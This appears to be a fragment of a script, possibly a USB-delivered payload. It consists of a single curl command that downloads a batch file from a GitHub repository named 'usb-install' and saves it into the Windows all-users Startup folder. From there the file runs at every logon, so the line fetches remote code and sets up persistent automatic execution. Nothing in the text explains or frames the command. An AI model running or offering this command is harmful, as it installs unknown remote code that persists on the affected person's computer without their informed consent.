...
curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/Windows.bat" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.bat"
